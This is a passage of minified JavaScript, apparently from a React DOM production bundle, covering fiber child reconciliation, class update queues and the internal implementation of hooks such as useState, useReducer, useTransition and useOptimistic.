t.$$typeof===g?Error(o(525)):(e=Object.prototype.toString.call(t),Error(o(31,e===`[object Object]`?`object with keys {`+Object.keys(t).join(`, `)+`}`:e)))}function Ha(e){function t(t,n){if(e){var r=t.deletions;r===null?(t.deletions=[n],t.flags|=16):r.push(n)}}function n(n,r){if(!e)return null;for(;r!==null;)t(n,r),r=r.sibling;return null}function r(e){for(var t=new Map;e!==null;)e.key===null?t.set(e.index,e):t.set(e.key,e),e=e.sibling;return t}function i(e,t){return e=_i(e,t),e.index=0,e.sibling=null,e}function a(t,n,r){return t.index=r,e?(r=t.alternate,r===null?(t.flags|=67108866,n):(r=r.index,r<n?(t.flags|=67108866,n):r)):(t.flags|=1048576,n)}function s(t){return e&&t.alternate===null&&(t.flags|=67108866),t}function c(e,t,n,r){return t===null||t.tag!==6?(t=xi(n,e.mode,r),t.return=e,t):(t=i(t,n),t.return=e,t)}function l(e,t,n,r){var a=n.type;return a===y?d(e,t,n.props.children,r,n.key):t!==null&&(t.elementType===a||typeof a==`object`&&a&&a.$$typeof===w&&Na(a)===t.type)?(t=i(t,n.props),Ba(t,n),t.return=e,t):(t=yi(n.type,n.key,n.props,null,e.mode,r),Ba(t,n),t.return=e,t)}function u(e,t,n,r){return t===null||t.tag!==4||t.stateNode.containerInfo!==n.containerInfo||t.stateNode.implementation!==n.implementation?(t=Ci(n,e.mode,r),t.return=e,t):(t=i(t,n.children||[]),t.return=e,t)}function d(e,t,n,r,a){return t===null||t.tag!==7?(t=bi(n,e.mode,r,a),t.return=e,t):(t=i(t,n),t.return=e,t)}function f(e,t,n){if(typeof t==`string`&&t!==``||typeof t==`number`||typeof t==`bigint`)return t=xi(``+t,e.mode,n),t.return=e,t;if(typeof t==`object`&&t){switch(t.$$typeof){case _:return n=yi(t.type,t.key,t.props,null,e.mode,n),Ba(n,t),n.return=e,n;case v:return t=Ci(t,e.mode,n),t.return=e,t;case w:return t=Na(t),f(e,t,n)}if(ue(t)||se(t))return t=bi(t,e.mode,n,null),t.return=e,t;if(typeof t.then==`function`)return f(e,za(t),n);if(t.$$typeof===C)return f(e,ca(e,t),n);Va(e,t)}return null}function p(e,t,n,r){var i=t===null?null:t.key;if(typeof n==`string`&&n!==``||typeof n==`number`||typeof n==`bigint`)return i===null?c(e,t,``+n,r):null;if(typeof n==`object`&&n){switch(n.$$typeof){case _:return n.key===i?l(e,t,n,r):null;case v:return n.key===i?u(e,t,n,r):null;case w:return n=Na(n),p(e,t,n,r)}if(ue(n)||se(n))return i===null?d(e,t,n,r,null):null;if(typeof n.then==`function`)return p(e,t,za(n),r);if(n.$$typeof===C)return p(e,t,ca(e,n),r);Va(e,n)}return null}function m(e,t,n,r,i){if(typeof r==`string`&&r!==``||typeof r==`number`||typeof r==`bigint`)return e=e.get(n)||null,c(t,e,``+r,i);if(typeof r==`object`&&r){switch(r.$$typeof){case _:return e=e.get(r.key===null?n:r.key)||null,l(t,e,r,i);case v:return e=e.get(r.key===null?n:r.key)||null,u(t,e,r,i);case w:return r=Na(r),m(e,t,n,r,i)}if(ue(r)||se(r))return e=e.get(n)||null,d(t,e,r,i,null);if(typeof r.then==`function`)return m(e,t,n,za(r),i);if(r.$$typeof===C)return m(e,t,n,ca(t,r),i);Va(t,r)}return null}function h(i,o,s,c){for(var l=null,u=null,d=o,h=o=0,g=null;d!==null&&h<s.length;h++){d.index>h?(g=d,d=null):g=d.sibling;var _=p(i,d,s[h],c);if(_===null){d===null&&(d=g);break}e&&d&&_.alternate===null&&t(i,d),o=a(_,o,h),u===null?l=_:u.sibling=_,u=_,d=g}if(h===s.length)return n(i,d),N&&Fi(i,h),l;if(d===null){for(;h<s.length;h++)d=f(i,s[h],c),d!==null&&(o=a(d,o,h),u===null?l=d:u.sibling=d,u=d);return N&&Fi(i,h),l}for(d=r(d);h<s.length;h++)g=m(d,i,h,s[h],c),g!==null&&(e&&g.alternate!==null&&d.delete(g.key===null?h:g.key),o=a(g,o,h),u===null?l=g:u.sibling=g,u=g);return e&&d.forEach(function(e){return t(i,e)}),N&&Fi(i,h),l}function g(i,s,c,l){if(c==null)throw Error(o(151));for(var u=null,d=null,h=s,g=s=0,_=null,v=c.next();h!==null&&!v.done;g++,v=c.next()){h.index>g?(_=h,h=null):_=h.sibling;var y=p(i,h,v.value,l);if(y===null){h===null&&(h=_);break}e&&h&&y.alternate===null&&t(i,h),s=a(y,s,g),d===null?u=y:d.sibling=y,d=y,h=_}if(v.done)return n(i,h),N&&Fi(i,g),u;if(h===null){for(;!v.done;g++,v=c.next())v=f(i,v.value,l),v!==null&&(s=a(v,s,g),d===null?u=v:d.sibling=v,d=v);return N&&Fi(i,g),u}for(h=r(h);!v.done;g++,v=c.next())v=m(h,i,g,v.value,l),v!==null&&(e&&v.alternate!==null&&h.delete(v.key===null?g:v.key),s=a(v,s,g),d===null?u=v:d.sibling=v,d=v);return e&&h.forEach(function(e){return t(i,e)}),N&&Fi(i,g),u}function b(e,r,a,c){if(typeof a==`object`&&a&&a.type===y&&a.key===null&&(a=a.props.children),typeof a==`object`&&a){switch(a.$$typeof){case _:a:{for(var l=a.key;r!==null;){if(r.key===l){if(l=a.type,l===y){if(r.tag===7){n(e,r.sibling),c=i(r,a.props.children),c.return=e,e=c;break a}}else if(r.elementType===l||typeof l==`object`&&l&&l.$$typeof===w&&Na(l)===r.type){n(e,r.sibling),c=i(r,a.props),Ba(c,a),c.return=e,e=c;break a}n(e,r);break}else t(e,r);r=r.sibling}a.type===y?(c=bi(a.props.children,e.mode,c,a.key),c.return=e,e=c):(c=yi(a.type,a.key,a.props,null,e.mode,c),Ba(c,a),c.return=e,e=c)}return s(e);case v:a:{for(l=a.key;r!==null;){if(r.key===l)if(r.tag===4&&r.stateNode.containerInfo===a.containerInfo&&r.stateNode.implementation===a.implementation){n(e,r.sibling),c=i(r,a.children||[]),c.return=e,e=c;break a}else{n(e,r);break}else t(e,r);r=r.sibling}c=Ci(a,e.mode,c),c.return=e,e=c}return s(e);case w:return a=Na(a),b(e,r,a,c)}if(ue(a))return h(e,r,a,c);if(se(a)){if(l=se(a),typeof l!=`function`)throw Error(o(150));return a=l.call(a),g(e,r,a,c)}if(typeof a.then==`function`)return b(e,r,za(a),c);if(a.$$typeof===C)return b(e,r,ca(e,a),c);Va(e,a)}return typeof a==`string`&&a!==``||typeof a==`number`||typeof a==`bigint`?(a=``+a,r!==null&&r.tag===6?(n(e,r.sibling),c=i(r,a),c.return=e,e=c):(n(e,r),c=xi(a,e.mode,c),c.return=e,e=c),s(e)):n(e,r)}return function(e,t,n,r){try{Ra=0;var i=b(e,t,n,r);return La=null,i}catch(t){if(t===Da||t===ka)throw t;var a=hi(29,t,null,e.mode);return a.lanes=r,a.return=e,a}}}var Ua=Ha(!0),Wa=Ha(!1),Ga=!1;function Ka(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function qa(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function Ja(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function Ya(e,t,n){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,G&2){var i=r.pending;return i===null?t.next=t:(t.next=i.next,i.next=t),r.pending=t,t=fi(e),di(e,null,n),t}return ci(e,r,t,n),fi(e)}function Xa(e,t,n){if(t=t.updateQueue,t!==null&&(t=t.shared,n&4194048)){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,ut(e,n)}}function Za(e,t){var n=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var i=null,a=null;if(n=n.firstBaseUpdate,n!==null){do{var o={lane:n.lane,tag:n.tag,payload:n.payload,callback:null,next:null};a===null?i=a=o:a=a.next=o,n=n.next}while(n!==null);a===null?i=a=t:a=a.next=t}else i=a=t;n={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:a,shared:r.shared,callbacks:r.callbacks},e.updateQueue=n;return}e=n.lastBaseUpdate,e===null?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}var Qa=!1;function $a(){if(Qa){var e=va;if(e!==null)throw e}}function eo(e,t,n,r){Qa=!1;var i=e.updateQueue;Ga=!1;var a=i.firstBaseUpdate,o=i.lastBaseUpdate,s=i.shared.pending;if(s!==null){i.shared.pending=null;var c=s,l=c.next;c.next=null,o===null?a=l:o.next=l,o=c;var u=e.alternate;u!==null&&(u=u.updateQueue,s=u.lastBaseUpdate,s!==o&&(s===null?u.firstBaseUpdate=l:s.next=l,u.lastBaseUpdate=c))}if(a!==null){var d=i.baseState;o=0,u=l=c=null,s=a;do{var f=s.lane&-536870913,p=f!==s.lane;if(p?(J&f)===f:(r&f)===f){f!==0&&f===_a&&(Qa=!0),u!==null&&(u=u.next={lane:0,tag:s.tag,payload:s.payload,callback:null,next:null});a:{var m=e,g=s;f=t;var _=n;switch(g.tag){case 1:if(m=g.payload,typeof m==`function`){d=m.call(_,d,f);break a}d=m;break a;case 3:m.flags=m.flags&-65537|128;case 0:if(m=g.payload,f=typeof m==`function`?m.call(_,d,f):m,f==null)break a;d=h({},d,f);break a;case 2:Ga=!0}}f=s.callback,f!==null&&(e.flags|=64,p&&(e.flags|=8192),p=i.callbacks,p===null?i.callbacks=[f]:p.push(f))}else p={lane:f,tag:s.tag,payload:s.payload,callback:s.callback,next:null},u===null?(l=u=p,c=d):u=u.next=p,o|=f;if(s=s.next,s===null){if(s=i.shared.pending,s===null)break;p=s,s=p.next,p.next=null,i.lastBaseUpdate=p,i.shared.pending=null}}while(1);u===null&&(c=d),i.baseState=c,i.firstBaseUpdate=l,i.lastBaseUpdate=u,a===null&&(i.shared.lanes=0),Gl|=o,e.lanes=o,e.memoizedState=d}}function to(e,t){if(typeof e!=`function`)throw Error(o(191,e));e.call(t)}function no(e,t){var n=e.callbacks;if(n!==null)for(e.callbacks=null,e=0;e<n.length;e++)to(n[e],t)}var ro=me(null),io=me(0);function ao(e,t){e=Wl,D(io,e),D(ro,t),Wl=e|t.baseLanes}function oo(){D(io,Wl),D(ro,ro.current)}function so(){Wl=io.current,he(ro),he(io)}var co=me(null),lo=null;function uo(e){var t=e.alternate;D(F,F.current&1),D(co,e),lo===null&&(t===null||ro.current!==null||t.memoizedState!==null)&&(lo=e)}function fo(e){D(F,F.current),D(co,e),lo===null&&(lo=e)}function po(e){e.tag===22?(D(F,F.current),D(co,e),lo===null&&(lo=e)):mo(e)}function mo(){D(F,F.current),D(co,co.current)}function ho(e){he(co),lo===e&&(lo=null),he(F)}var F=me(0);function go(e){for(var t=e;t!==null;){if(t.tag===13){var n=t.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||af(n)||of(n)))return t}else if(t.tag===19&&(t.memoizedProps.revealOrder===`forwards`||t.memoizedProps.revealOrder===`backwards`||t.memoizedProps.revealOrder===`unstable_legacy-backwards`||t.memoizedProps.revealOrder===`together`)){if(t.flags&128)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var _o=0,I=null,L=null,R=null,vo=!1,yo=!1,bo=!1,xo=0,So=0,Co=null,wo=0;function z(){throw Error(o(321))}function To(e,t){if(t===null)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!kr(e[n],t[n]))return!1;return!0}function Eo(e,t,n,r,i,a){return _o=a,I=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,T.H=e===null||e.memoizedState===null?Hs:Us,bo=!1,a=n(r,i),bo=!1,yo&&(a=Oo(t,n,r,i)),Do(e),a}function Do(e){T.H=Vs;var t=L!==null&&L.next!==null;if(_o=0,R=L=I=null,vo=!1,So=0,Co=null,t)throw Error(o(300));e===null||V||(e=e.dependencies,e!==null&&aa(e)&&(V=!0))}function Oo(e,t,n,r){I=e;var i=0;do{if(yo&&(Co=null),So=0,yo=!1,25<=i)throw Error(o(301));if(i+=1,R=L=null,e.updateQueue!=null){var a=e.updateQueue;a.lastEffect=null,a.events=null,a.stores=null,a.memoCache!=null&&(a.memoCache.index=0)}T.H=Ws,a=t(n,r)}while(yo);return a}function ko(){var e=T.H,t=e.useState()[0];return t=typeof t.then==`function`?Fo(t):t,e=e.useState()[0],(L===null?null:L.memoizedState)!==e&&(I.flags|=1024),t}function Ao(){var e=xo!==0;return xo=0,e}function jo(e,t,n){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~n}function Mo(e){if(vo){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}vo=!1}_o=0,R=L=I=null,yo=!1,So=xo=0,Co=null}function No(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return R===null?I.memoizedState=R=e:R=R.next=e,R}function B(){if(L===null){var e=I.alternate;e=e===null?null:e.memoizedState}else e=L.next;var t=R===null?I.memoizedState:R.next;if(t!==null)R=t,L=e;else{if(e===null)throw I.alternate===null?Error(o(467)):Error(o(310));L=e,e={memoizedState:L.memoizedState,baseState:L.baseState,baseQueue:L.baseQueue,queue:L.queue,next:null},R===null?I.memoizedState=R=e:R=R.next=e}return R}function Po(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Fo(e){var t=So;return So+=1,Co===null&&(Co=[]),e=Ma(Co,e,t),t=I,(R===null?t.memoizedState:R.next)===null&&(t=t.alternate,T.H=t===null||t.memoizedState===null?Hs:Us),e}function Io(e){if(typeof e==`object`&&e){if(typeof e.then==`function`)return Fo(e);if(e.$$typeof===C)return sa(e)}throw Error(o(438,String(e)))}function Lo(e){var t=null,n=I.updateQueue;if(n!==null&&(t=n.memoCache),t==null){var r=I.alternate;r!==null&&(r=r.updateQueue,r!==null&&(r=r.memoCache,r!=null&&(t={data:r.data.map(function(e){return e.slice()}),index:0})))}if(t??={data:[],index:0},n===null&&(n=Po(),I.updateQueue=n),n.memoCache=t,n=t.data[t.index],n===void 0)for(n=t.data[t.index]=Array(e),r=0;r<e;r++)n[r]=ae;return t.index++,n}function Ro(e,t){return typeof t==`function`?t(e):t}function zo(e){return Bo(B(),L,e)}function Bo(e,t,n){var r=e.queue;if(r===null)throw Error(o(311));r.lastRenderedReducer=n;var i=e.baseQueue,a=r.pending;if(a!==null){if(i!==null){var s=i.next;i.next=a.next,a.next=s}t.baseQueue=i=a,r.pending=null}if(a=e.baseState,i===null)e.memoizedState=a;else{t=i.next;var c=s=null,l=null,u=t,d=!1;do{var f=u.lane&-536870913;if(f===u.lane?(_o&f)===f:(J&f)===f){var p=u.revertLane;if(p===0)l!==null&&(l=l.next={lane:0,revertLane:0,gesture:null,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),f===_a&&(d=!0);else if((_o&p)===p){u=u.next,p===_a&&(d=!0);continue}else f={lane:0,revertLane:u.revertLane,gesture:null,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null},l===null?(c=l=f,s=a):l=l.next=f,I.lanes|=p,Gl|=p;f=u.action,bo&&n(a,f),a=u.hasEagerState?u.eagerState:n(a,f)}else p={lane:f,revertLane:u.revertLane,gesture:u.gesture,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null},l===null?(c=l=p,s=a):l=l.next=p,I.lanes|=f,Gl|=f;u=u.next}while(u!==null&&u!==t);if(l===null?s=a:l.next=c,!kr(a,e.memoizedState)&&(V=!0,d&&(n=va,n!==null)))throw n;e.memoizedState=a,e.baseState=s,e.baseQueue=l,r.lastRenderedState=a}return i===null&&(r.lanes=0),[e.memoizedState,r.dispatch]}function Vo(e){var t=B(),n=t.queue;if(n===null)throw Error(o(311));n.lastRenderedReducer=e;var r=n.dispatch,i=n.pending,a=t.memoizedState;if(i!==null){n.pending=null;var s=i=i.next;do a=e(a,s.action),s=s.next;while(s!==i);kr(a,t.memoizedState)||(V=!0),t.memoizedState=a,t.baseQueue===null&&(t.baseState=a),n.lastRenderedState=a}return[a,r]}function Ho(e,t,n){var r=I,i=B(),a=N;if(a){if(n===void 0)throw Error(o(407));n=n()}else n=t();var s=!kr((L||i).memoizedState,n);if(s&&(i.memoizedState=n,V=!0),i=i.queue,ps(Go.bind(null,r,i,e),[e]),i.getSnapshot!==t||s||R!==null&&R.memoizedState.tag&1){if(r.flags|=2048,cs(9,{destroy:void 0},Wo.bind(null,r,i,n,t),null),K===null)throw Error(o(349));a||_o&127||Uo(r,t,n)}return n}function Uo(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},t=I.updateQueue,t===null?(t=Po(),I.updateQueue=t,t.stores=[e]):(n=t.stores,n===null?t.stores=[e]:n.push(e))}function Wo(e,t,n,r){t.value=n,t.getSnapshot=r,Ko(t)&&qo(e)}function Go(e,t,n){return n(function(){Ko(t)&&qo(e)})}function Ko(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!kr(e,n)}catch{return!0}}function qo(e){var t=ui(e,2);t!==null&&hu(t,e,2)}function Jo(e){var t=No();if(typeof e==`function`){var n=e;if(e=n(),bo){qe(!0);try{n()}finally{qe(!1)}}}return t.memoizedState=t.baseState=e,t.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ro,lastRenderedState:e},t}function Yo(e,t,n,r){return e.baseState=n,Bo(e,L,typeof r==`function`?r:Ro)}function Xo(e,t,n,r,i){if(Rs(e))throw Error(o(485));if(e=t.action,e!==null){var a={payload:i,action:e,next:null,isTransition:!0,status:`pending`,value:null,reason:null,listeners:[],then:function(e){a.listeners.push(e)}};T.T===null?a.isTransition=!1:n(!0),r(a),n=t.pending,n===null?(a.next=t.pending=a,Zo(t,a)):(a.next=n.next,t.pending=n.next=a)}}function Zo(e,t){var n=t.action,r=t.payload,i=e.state;if(t.isTransition){var a=T.T,o={};T.T=o;try{var s=n(i,r),c=T.S;c!==null&&c(o,s),Qo(e,t,s)}catch(n){es(e,t,n)}finally{a!==null&&o.types!==null&&(a.types=o.types),T.T=a}}else try{a=n(i,r),Qo(e,t,a)}catch(n){es(e,t,n)}}function Qo(e,t,n){typeof n==`object`&&n&&typeof n.then==`function`?n.then(function(n){$o(e,t,n)},function(n){return es(e,t,n)}):$o(e,t,n)}function $o(e,t,n){t.status=`fulfilled`,t.value=n,ts(t),e.state=n,t=e.pending,t!==null&&(n=t.next,n===t?e.pending=null:(n=n.next,t.next=n,Zo(e,n)))}function es(e,t,n){var r=e.pending;if(e.pending=null,r!==null){r=r.next;do t.status=`rejected`,t.reason=n,ts(t),t=t.next;while(t!==r)}e.action=null}function ts(e){e=e.listeners;for(var t=0;t<e.length;t++)(0,e[t])()}function ns(e,t){return t}function rs(e,t){if(N){var n=K.formState;if(n!==null){a:{var r=I;if(N){if(M){b:{for(var i=M,a=Hi;i.nodeType!==8;){if(!a){i=null;break b}if(i=cf(i.nextSibling),i===null){i=null;break b}}a=i.data,i=a===`F!`||a===`F`?i:null}if(i){M=cf(i.nextSibling),r=i.data===`F!`;break a}}Wi(r)}r=!1}r&&(t=n[0])}}return n=No(),n.memoizedState=n.baseState=t,r={pending:null,lanes:0,dispatch:null,lastRenderedReducer:ns,lastRenderedState:t},n.queue=r,n=Fs.bind(null,I,r),r.dispatch=n,r=Jo(!1),a=Ls.bind(null,I,!1,r.queue),r=No(),i={state:t,dispatch:null,action:e,pending:null},r.queue=i,n=Xo.bind(null,I,i,a,n),i.dispatch=n,r.memoizedState=e,[t,n,!1]}function is(e){return as(B(),L,e)}function as(e,t,n){if(t=Bo(e,t,ns)[0],e=zo(Ro)[0],typeof t==`object`&&t&&typeof t.then==`function`)try{var r=Fo(t)}catch(e){throw e===Da?ka:e}else r=t;t=B();var i=t.queue,a=i.dispatch;return n!==t.memoizedState&&(I.flags|=2048,cs(9,{destroy:void 0},os.bind(null,i,n),null)),[r,a,e]}function os(e,t){e.action=t}function ss(e){var t=B(),n=L;if(n!==null)return as(t,n,e);B(),t=t.memoizedState,n=B();var r=n.queue.dispatch;return n.memoizedState=e,[t,r,!1]}function cs(e,t,n,r){return e={tag:e,create:n,deps:r,inst:t,next:null},t=I.updateQueue,t===null&&(t=Po(),I.updateQueue=t),n=t.lastEffect,n===null?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e),e}function ls(){return B().memoizedState}function us(e,t,n,r){var i=No();I.flags|=e,i.memoizedState=cs(1|t,{destroy:void 0},n,r===void 0?null:r)}function ds(e,t,n,r){var i=B();r=r===void 0?null:r;var a=i.memoizedState.inst;L!==null&&r!==null&&To(r,L.memoizedState.deps)?i.memoizedState=cs(t,a,n,r):(I.flags|=e,i.memoizedState=cs(1|t,a,n,r))}function fs(e,t){us(8390656,8,e,t)}function ps(e,t){ds(2048,8,e,t)}function ms(e){I.flags|=4;var t=I.updateQueue;if(t===null)t=Po(),I.updateQueue=t,t.events=[e];else{var n=t.events;n===null?t.events=[e]:n.push(e)}}function hs(e){var t=B().memoizedState;return ms({ref:t,nextImpl:e}),function(){if(G&2)throw Error(o(440));return t.impl.apply(void 0,arguments)}}function gs(e,t){return ds(4,2,e,t)}function _s(e,t){return ds(4,4,e,t)}function vs(e,t){if(typeof t==`function`){e=e();var n=t(e);return function(){typeof n==`function`?n():t(null)}}if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function ys(e,t,n){n=n==null?null:n.concat([e]),ds(4,4,vs.bind(null,t,e),n)}function bs(){}function xs(e,t){var n=B();t=t===void 0?null:t;var r=n.memoizedState;return t!==null&&To(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function Ss(e,t){var n=B();t=t===void 0?null:t;var r=n.memoizedState;if(t!==null&&To(t,r[1]))return r[0];if(r=e(),bo){qe(!0);try{e()}finally{qe(!1)}}return n.memoizedState=[r,t],r}function Cs(e,t,n){return n===void 0||_o&1073741824&&!(J&261930)?e.memoizedState=t:(e.memoizedState=n,e=mu(),I.lanes|=e,Gl|=e,n)}function ws(e,t,n,r){return kr(n,t)?n:ro.current===null?!(_o&42)||_o&1073741824&&!(J&261930)?(V=!0,e.memoizedState=n):(e=mu(),I.lanes|=e,Gl|=e,t):(e=Cs(e,n,r),kr(e,t)||(V=!0),e)}function Ts(e,t,n,r,i){var a=E.p;E.p=a!==0&&8>a?a:8;var o=T.T,s={};T.T=s,Ls(e,!1,t,n);try{var c=i(),l=T.S;l!==null&&l(s,c),typeof c==`object`&&c&&typeof c.then==`function`?Is(e,t,xa(c,r),pu(e)):Is(e,t,r,pu(e))}catch(n){Is(e,t,{then:function(){},status:`rejected`,reason:n},pu())}finally{E.p=a,o!==null&&s.types!==null&&(o.types=s.types),T.T=o}}function Es(){}function Ds(e,t,n,r){if(e.tag!==5)throw Error(o(476));var i=Os(e).queue;Ts(e,i,t,de,n===null?Es:function(){return ks(e),n(r)})}function Os(e){var t=e.memoizedState;if(t!==null)return t;t={memoizedState:de,baseState:de,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ro,lastRenderedState:de},next:null};var n={};return t.next={memoizedState:n,baseState:n,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ro,lastRenderedState:n},next:null},e.memoizedState=t,e=e.alternate,e!==null&&(e.memoizedState=t),t}function ks(e){var t=Os(e);t.next===null&&(t=e.alternate.memoizedState),Is(e,t.next.queue,{},pu())}function As(){return sa(Qf)}function js(){return B().memoizedState}function Ms(){return B().memoizedState}function Ns(e){for(var t=e.return;t!==null;){switch(t.tag){case 24:case 3:var n=pu();e=Ja(n);var r=Ya(t,e,n);r!==null&&(hu(r,t,n),Xa(r,t,n)),t={cache:pa()},e.payload=t;return}t=t.return}}function Ps(e,t,n){var r=pu();n={lane:r,revertLane:0,gesture:null,action:n,hasEagerState:!1,eagerState:null,next:null},Rs(e)?zs(t,n):(n=li(e,t,n,r),n!==null&&(hu(n,e,r),Bs(n,t,r)))}function Fs(e,t,n){Is(e,t,n,pu())}function Is(e,t,n,r){var i={lane:r,revertLane:0,gesture:null,action:n,hasEagerState:!1,eagerState:null,next:null};if(Rs(e))zs(t,i);else{var a=e.alternate;if(e.lanes===0&&(a===null||a.lanes===0)&&(a=t.lastRenderedReducer,a!==null))try{var o=t.lastRenderedState,s=a(o,n);if(i.hasEagerState=!0,i.eagerState=s,kr(s,o))return ci(e,t,i,0),K===null&&si(),!1}catch{}if(n=li(e,t,i,r),n!==null)return hu(n,e,r),Bs(n,t,r),!0}return!1}function Ls(e,t,n,r){if(r={lane:2,revertLane:dd(),gesture:null,action:r,hasEagerState:!1,eagerState:null,next:null},Rs(e)){if(t)throw Error(o(479))}else t=li(e,n,r,2),t!==null&&hu(t,e,2)}function Rs(e){var t=e.alternate;return e===I||t!==null&&t===I}function zs(e,t){yo=vo=!0;var n=e.pending;n===null?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function Bs(e,t,n){if(n&4194048){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,ut(e,n)}}var Vs={readContext:sa,use:Io,useCallback:z,useContext:z,useEffect:z,useImperativeHandle:z,useLayoutEffect:z,useInsertionEffect:z,useMemo:z,useReducer:z,useRef:z,useState:z,useDebugValue:z,useDeferredValue:z,useTransition:z,useSyncExternalStore:z,useId:z,useHostTransitionStatus:z,useFormState:z,useActionState:z,useOptimistic:z,useMemoCache:z,useCacheRefresh:z};Vs.useEffectEvent=z;var Hs={readContext:sa,use:Io,useCallback:function(e,t){return No().memoizedState=[e,t===void 0?null:t],e},useContext:sa,useEffect:fs,useImperativeHandle:function(e,t,n){n=n==null?null:n.concat([e]),us(4194308,4,vs.bind(null,t,e),n)},useLayoutEffect:function(e,t){return us(4194308,4,e,t)},useInsertionEffect:function(e,t){us(4,2,e,t)},useMemo:function(e,t){var n=No();t=t===void 0?null:t;var r=e();if(bo){qe(!0);try{e()}finally{qe(!1)}}return n.memoizedState=[r,t],r},useReducer:function(e,t,n){var r=No();if(n!==void 0){var i=n(t);if(bo){qe(!0);try{n(t)}finally{qe(!1)}}}else i=t;return r.memoizedState=r.baseState=i,e={pending:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:i},r.queue=e,e=e.dispatch=Ps.bind(null,I,e),[r.memoizedState,e]},useRef:function(e){var t=No();return e={current:e},t.memoizedState=e},useState:function(e){e=Jo(e);var t=e.queue,n=Fs.bind(null,I,t);return t.dispatch=n,[e.memoizedState,n]},useDebugValue:bs,useDeferredValue:function(e,t){return Cs(No(),e,t)},useTransition:function(){var e=Jo(!1);return e=Ts.bind(null,I,e.queue,!0,!1),No().memoizedState=e,[!1,e]},useSyncExternalStore:function(e,t,n){var r=I,i=No();if(N){if(n===void 0)throw Error(o(407));n=n()}else{if(n=t(),K===null)throw Error(o(349));J&127||Uo(r,t,n)}i.memoizedState=n;var a={value:n,getSnapshot:t};return i.queue=a,fs(Go.bind(null,r,a,e),[e]),r.flags|=2048,cs(9,{destroy:void 0},Wo.bind(null,r,a,n,t),null),n},useId:function(){var e=No(),t=K.identifierPrefix;if(N){var n=Pi,r=Ni;n=(r&~(1<<32-Je(r)-1)).toString(32)+n,t=`_`+t+`R_`+n,n=xo++,0<n&&(t+=`H`+n.toString(32)),t+=`_`}else n=wo++,t=`_`+t+`r_`+n.toString(32)+`_`;return e.memoizedState=t},useHostTransitionStatus:As,useFormState:rs,useActionState:rs,useOptimistic:function(e){var t=No();t.memoizedState=t.baseState=e;var n={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return t.queue=n,t=Ls.bind(null,I,!0,n),n.dispatch=t,[e,t]},useMemoCache:Lo,useCacheRefresh:function(){return No().memoizedState=Ns.bind(null,I)},useEffectEvent:function(e){var t=No(),n={impl:e};return t.memoizedState=n,function(){if(G&2)throw Error(o(440));return n.impl.apply(void 0,arguments)}}},Us={readContext:sa,use:Io,useCallback:xs,useContext:sa,useEffect:ps,useImperativeHandle:ys,useInsertionEffect:gs,useLayoutEffect:_s,useMemo:Ss,useReducer:zo,useRef:ls,useState:function(){return zo(Ro)},useDebugValue:bs,useDeferredValue:function(e,t){return ws(B(),L.memoizedState,e,t)},useTransition:function(){var e=zo(Ro)[0],t=B().memoizedState;return[typeof e==`boolean`?e:Fo(e),t]},useSyncExternalStore:Ho,useId:js,useHostTransitionStatus:As,useFormState:is,useActionState:is,useOptimistic:function(e,t){return Yo(B(),L,e,t)},useMemoCache:Lo,useCacheRefresh:Ms};Us.useEffectEvent=hs;var Ws={readContext:sa,use:Io,useCallback:xs,useContext:sa,useEffect:ps,useImperativeHandle:ys,useInsertionEffect:gs,useLayoutEffect:_s,useMemo:Ss,useReducer:Vo,useRef:ls,useState:function(){return Vo(Ro)},useDebugValue:bs,useDeferredValue:function(e,t){var n=B();return L===null?Cs(n,e,t):ws(n,L.memoizedState,e,t)},useTransition:function(){var e=Vo(Ro)[0],t=B().memoizedState;return[typeof e==`boolean`?e:Fo(e),t]},useSyncExternalStore:Ho,useId:js,useHostTransitionStatus:As,useFormState:ss,useActionState:ss,useOptimistic:function(e,t){var n=B();return L===null?(n.baseState=e,[e,n.queue.dispatch]):Yo(n,L,e,t)},useMemoCache:Lo,useCacheRefresh:Ms};Ws.useEffectEvent=hs;function Gs(e,t,n,r){t=e.memoizedState,n=n(r,t),n=n==null?t:h({},t,n),e.memoizedState=n,e.lanes===0&&(e.updateQueue.baseState=n)}var Ks={enqueueSetState:function(e,t,n){e=e._reactInternals;var 